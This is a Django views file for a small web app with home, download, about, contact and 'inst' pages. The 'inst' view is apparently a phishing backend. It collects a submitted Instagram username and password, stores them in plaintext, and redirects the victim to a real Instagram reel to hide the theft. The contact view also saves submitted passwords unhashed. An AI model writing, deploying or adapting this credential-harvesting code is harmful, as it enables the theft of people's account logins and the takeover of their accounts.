from django.shortcuts import render
from apptn.models import Contact
from apptn.models import Inst
from django.shortcuts import HttpResponse, redirect

####### views are here #######
def index(request):
  return render(request, 'index.html')

def download(request):
  return render(request, 'download.html')

def about(request):
  return render(request, 'about.html')

def contact(request):
  if request.method == 'POST':
    name = request.POST.get('name')
    password = request.POST.get('password')
    desc = request.POST.get('desc')

#for all
    contact = Contact(name=name, password=password, desc=desc)
    contact.save()
  return render(request, 'contact.html')

def inst(request):
  if request.method == 'POST':
    iname = request.POST.get('iname')
    ipassword = request.POST.get('ipass')

#for all
    cont = Inst(iname=iname, ipassword=ipassword)
    cont.save()
    return redirect("https://www.instagram.com/reel/C3KEtNoP4dQ/?igsh=ZjJpcWU4bXBxOHVh")
  else:
    return render(request, 'inst.html')